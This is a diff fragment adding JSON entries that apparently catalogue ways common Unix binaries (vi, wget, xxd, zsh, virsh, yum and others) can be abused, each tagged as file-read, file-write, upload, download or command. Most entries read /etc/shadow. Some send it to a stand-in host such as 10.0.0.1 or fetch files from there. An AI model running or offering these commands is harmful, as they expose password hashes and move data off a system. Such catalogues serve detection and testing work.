+      "binary": "uniq",
+      "category": "file-read"
+    },
+    {
+      "command": "echo DATA >/tmp/tempfile\nupdate-alternatives --force --install /tmp/evil x /tmp/tempfile 0",
+      "binary": "update-alternatives",
+      "category": "file-write"
+    },
+    {
+      "command": "urlget - /etc/shadow",
+      "binary": "urlget",
+      "category": "file-read"
+    },
+    {
+      "command": "uuencode /etc/shadow /dev/stdout | uudecode",
+      "binary": "uuencode",
+      "category": "file-read"
+    },
+    {
+      "command": "varnishncsa -g request -q 'ReqURL ~ \"/xxxxxxxxxx\"' -F '%{yyy}i' -w /tmp/evil",
+      "binary": "varnishncsa",
+      "category": "file-write"
+    },
+    {
+      "command": "vi /etc/shadow",
+      "binary": "vi",
+      "category": "file-read"
+    },
+    {
+      "command": "vi /tmp/evil\niDATA\n^[\nw",
+      "binary": "vi",
+      "category": "file-write"
+    },
+    {
+      "command": "vim -c ':redir! >/tmp/evil | echo \"DATA\" | redir END | q'",
+      "binary": "vim",
+      "category": "file-read"
+    },
+    {
+      "command": "cat >/tmp/tempfile.xml <<EOF\n<domain type='kvm'>\n  <name>x</name>\n  <os>\n    <type arch='x86_64'>hvm</type>\n  </os>\n  <memory unit='KiB'>1</memory>\n  <devices>\n    <interface type='ethernet'>\n      <script path='/tmp/evil.sh'/>\n    </interface>\n  </devices>\n</domain>\nEOF\nvirsh -c qemu:///system create /tmp/tempfile.xml\nvirsh -c qemu:///system destroy x",
+      "binary": "virsh",
+      "category": "command"
+    },
+    {
+      "command": "echo DATA >/tmp/tempfile\n\ncat >/tmp/tempfile.xml <<EOF\n<volume type='file'>\n  <name>y</name>\n  <key>/tmp/outdir/output-file</key>\n  <source>\n  </source>\n  <capacity unit='bytes'>5</capacity>\n  <allocation unit='bytes'>4096</allocation>\n  <physical unit='bytes'>5</physical>\n  <target>\n    <path>/tmp/outdir/output-file</path>\n    <format type='raw'/>\n    <permissions>\n      <mode>0600</mode>\n      <owner>0</owner>\n      <group>0</group>\n    </permissions>\n  </target>\n</volume>\nEOF\n\nvirsh -c qemu:///system pool-create-as x dir --target /tmp/outdir/\nvirsh -c qemu:///system vol-create --pool x --file /tmp/tempfile.xml\nvirsh -c qemu:///system vol-upload --pool x /tmp/outdir/output-file /tmp/tempfile\nvirsh -c qemu:///system pool-destroy x",
+      "binary": "virsh",
+      "category": "file-write"
+    },
+    {
+      "command": "virsh -c qemu:///system pool-create-as x dir --target /tmp/dir/\nvirsh -c qemu:///system vol-download --pool x input-file output-file\nvirsh -c qemu:///system pool-destroy x",
+      "binary": "virsh",
+      "category": "file-write"
+    },
+    {
+      "command": "w3m -dump /etc/shadow",
+      "binary": "w3m",
+      "category": "file-read"
+    },
+    {
+      "command": "wall --nobanner /etc/shadow",
+      "binary": "wall",
+      "category": "file-read"
+    },
+    {
+      "command": "wc --files0-from /etc/shadow",
+      "binary": "wc",
+      "category": "file-read"
+    },
+    {
+      "command": "wget http://10.0.0.1/etc/shadow -O /tmp/evil",
+      "binary": "wget",
+      "category": "download"
+    },
+    {
+      "command": "wget -i /etc/shadow",
+      "binary": "wget",
+      "category": "file-read"
+    },
+    {
+      "command": "wget -i /etc/shadow -o /tmp/evil",
+      "binary": "wget",
+      "category": "file-write"
+    },
+    {
+      "command": "wget --post-file=/etc/shadow http://10.0.0.1",
+      "binary": "wget",
+      "category": "upload"
+    },
+    {
+      "command": "wget --post-data=DATA http://10.0.0.1",
+      "binary": "wget",
+      "category": "upload"
+    },
+    {
+      "command": "whiptail --textbox --scrolltext /etc/shadow 0 0",
+      "binary": "whiptail",
+      "category": "file-read"
+    },
+    {
+      "command": "whois -h 10.0.0.1 -p 4444 x",
+      "binary": "whois",
+      "category": "download"
+    },
+    {
+      "command": "whois -h 10.0.0.1 -p 4444 DATA",
+      "binary": "whois",
+      "category": "upload"
+    },
+    {
+      "command": "wireshark -c 1 -i lo -k -f 'udp port 4444' &\necho DATA | nc -u 127.127.127.127 4444",
+      "binary": "wireshark",
+      "category": "file-write"
+    },
+    {
+      "command": "xargs -a /etc/shadow -0",
+      "binary": "xargs",
+      "category": "file-read"
+    },
+    {
+      "command": "xmodmap -v /etc/shadow",
+      "binary": "xmodmap",
+      "category": "file-read"
+    },
+    {
+      "command": "xmore /etc/shadow",
+      "binary": "xmore",
+      "category": "file-read"
+    },
+    {
+      "command": "xpad -f /etc/shadow",
+      "binary": "xpad",
+      "category": "file-read"
+    },
+    {
+      "command": "xxd /etc/shadow | xxd -r",
+      "binary": "xxd",
+      "category": "file-read"
+    },
+    {
+      "command": "echo DATA | xxd | xxd -r - /tmp/evil",
+      "binary": "xxd",
+      "category": "file-write"
+    },
+    {
+      "command": "xz -c /etc/shadow | xz -d",
+      "binary": "xz",
+      "category": "file-read"
+    },
+    {
+      "command": "yelp man:/etc/shadow",
+      "binary": "yelp",
+      "category": "file-read"
+    },
+    {
+      "command": "yum localinstall -y x-1.0-1.noarch.rpm",
+      "binary": "yum",
+      "category": "command"
+    },
+    {
+      "command": "yum install http://10.0.0.1/etc/shadow.rpm",
+      "binary": "yum",
+      "category": "download"
+    },
+    {
+      "command": "zcat -f /etc/shadow",
+      "binary": "zcat",
+      "category": "file-read"
+    },
+    {
+      "command": "echo 'Rule Jordan 0 1 xxx Jan lastSun 2 1:00d -' >/tmp/tempfile\necho 'Zone Test 2:00 Jordan CE%sT' >>/tmp/tempfile\nzic -d . -y /tmp/evil.sh /tmp/tempfile",
+      "binary": "zic",
+      "category": "command"
+    },
+    {
+      "command": "zip /tmp/tempfile /etc/shadow\nunzip -p /tmp/tempfile",
+      "binary": "zip",
+      "category": "file-read"
+    },
+    {
+      "command": "zsh -c 'echo \"$(</etc/shadow)\"'",
+      "binary": "zsh",
+      "category": "file-read"
+    },
+    {
+      "command": "zsh -c '</etc/shadow'",
+      "binary": "zsh",
+      "category": "file-read"
+    },
+    {
+      "command": "zsh -c 'echo DATA >/tmp/evil'",
+      "binary": "zsh",
+      "category": "file-write"
+    },
+    {
+      "command": "zsoelim /etc/shadow",
+      "binary": "zsoelim",
+      "category": "file-read"
+    }
+  ]
+}
